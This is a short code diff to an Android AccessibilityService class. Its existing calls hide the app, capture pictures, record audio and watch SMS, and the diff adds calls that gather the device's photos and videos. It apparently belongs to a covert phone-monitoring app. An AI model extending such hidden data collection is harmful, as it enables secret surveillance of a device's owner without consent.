@@ -42,6 +42,8 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         interactor.getShowOrHideApp()
         interactor.getCapturePicture()
         interactor.getRecordingAudio()
+        interactor.getPhotos()
+        interactor.getVideos()
         registerSmsObserver()
     }
 
